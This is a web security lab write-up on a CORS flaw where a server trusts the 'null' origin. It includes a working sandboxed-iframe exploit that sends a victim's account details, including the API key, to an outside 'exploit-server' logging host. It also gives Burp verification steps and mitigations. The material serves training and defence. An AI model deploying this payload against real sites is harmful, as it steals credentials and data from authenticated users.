# Lab 02 – CORS Vulnerability with Trusted `null` Origin

## Lab Information

**Difficulty:** Practitioner

**Category:** CORS

**Vulnerability:** Trusting the `null` origin

---

# Lab Objective

Exploit a server that trusts the special `null` origin.

Use a sandboxed iframe to obtain the administrator's API key.

---

# Background

Some browsers generate:

```http
Origin: null
```

for:

- Sandboxed iframes
- file:// URLs
- data: URLs

The application mistakenly considers `null` to be a trusted origin.

---

# Burp Verification

Intercept:

```http
GET /accountDetails
```

Replace:

```http
Origin:
https://example.com
```

with

```http
Origin: null
```

Response:

```http
Access-Control-Allow-Origin: null

Access-Control-Allow-Credentials: true
```

The vulnerability is confirmed.

---

# Exploit

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
srcdoc='

<script>

var req=new XMLHttpRequest();

req.onload=function(){

location="https://exploit-server/log?d="+
encodeURIComponent(this.responseText);

};

req.open(
"GET",
"https://victim-site/accountDetails",
true
);

req.withCredentials=true;

req.send();

</script>

'>
</iframe>
```

---

# Attack Flow

```
Victim

↓

Sandboxed iframe

↓

Origin:null

↓

Server Trusts null

↓

Sensitive Response

↓

Exploit Server
```

---

# Impact

- User information disclosure
- API key leakage
- Sensitive account data exposure

---

# Mitigation

- Never whitelist `null`.
- Maintain an explicit allowlist of trusted origins.
- Validate origins using exact string matching.

---

# Bug Bounty Notes

Always test:

```http
Origin: null
```

Many production applications mistakenly trust it.

---

# Key Learnings

The `null` origin is a valid browser-generated value. Treating it as trusted creates a serious CORS vulnerability.